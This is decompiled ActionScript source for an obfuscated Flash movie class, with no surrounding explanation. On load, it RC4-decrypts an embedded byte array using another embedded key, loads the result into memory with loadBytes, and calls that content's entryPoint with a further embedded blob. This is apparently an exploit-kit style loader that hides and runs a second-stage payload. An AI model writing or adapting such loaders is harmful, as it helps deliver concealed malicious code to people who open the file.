package
{
   import flash.display.MovieClip;
   import flash.events.Event;
   import j.r;
   import flash.utils.ByteArray;
   import j.h;
   import j.v;
   import flash.display.Loader;
   import j.y;
   
   public class hzvmjwjj extends MovieClip
   {
       
      public function hzvmjwjj()
      {
         super();
         if(stage)
         {
            this.l();
         }
         else
         {
            addEventListener("addedToStage",this.l);
         }
      }
      
      private function l(param1:Event = null) : void
      {
         removeEventListener("addedToStage",this.l);
         var _loc3_:ByteArray = new r() as ByteArray;
         var _loc5_:ByteArray = new h() as ByteArray;
         var _loc2_:ByteArray = new v() as ByteArray;
         _loc3_ = this.m(_loc5_,_loc3_);
         var _loc4_:Loader = new Loader();
         _loc4_.contentLoaderInfo.addEventListener("complete",this.o);
         _loc4_.loadBytes(_loc3_);
      }
      
      private function o(param1:Event) : void
      {
         removeEventListener("complete",this.o);
         var _loc3_:ByteArray = new y() as ByteArray;
         var _loc2_:MovieClip = MovieClip(param1.target.content);
         stage.addChild(_loc2_);
         _loc2_.entryPoint(_loc3_);
      }
      
      private function m(param1:ByteArray, param2:ByteArray) : ByteArray
      {
         var _loc4_:* = 0;
         var _loc5_:* = 0;
         var _loc6_:* = 0;
         var _loc8_:ByteArray = new ByteArray();
         var _loc7_:uint = 0;
         var _loc3_:ByteArray = new ByteArray();
         _loc5_ = 0;
         while(_loc5_ < 256)
         {
            _loc8_[_loc5_] = _loc5_;
            _loc5_++;
         }
         _loc5_ = 0;
         while(_loc5_ < 256)
         {
            _loc7_ = _loc7_ + _loc8_[_loc5_] + param1[_loc5_ % param1.length] & 255;
            _loc4_ = _loc8_[_loc5_];
            _loc8_[_loc5_] = _loc8_[_loc7_];
            _loc8_[_loc7_] = _loc4_;
            _loc5_++;
         }
         _loc5_ = 0;
         _loc7_ = 0;
         _loc6_ = 0;
         while(_loc6_ < param2.length)
         {
            _loc5_ = _loc5_ + 1 & 255;
            _loc7_ = _loc7_ + _loc8_[_loc5_] & 255;
            _loc4_ = _loc8_[_loc5_];
            _loc8_[_loc5_] = _loc8_[_loc7_];
            _loc8_[_loc7_] = _loc4_;
            _loc3_[_loc6_] = param2[_loc6_] ^ _loc8_[_loc8_[_loc5_] + _loc8_[_loc7_] & 255];
            _loc6_++;
         }
         return _loc3_;
      }
   }
}
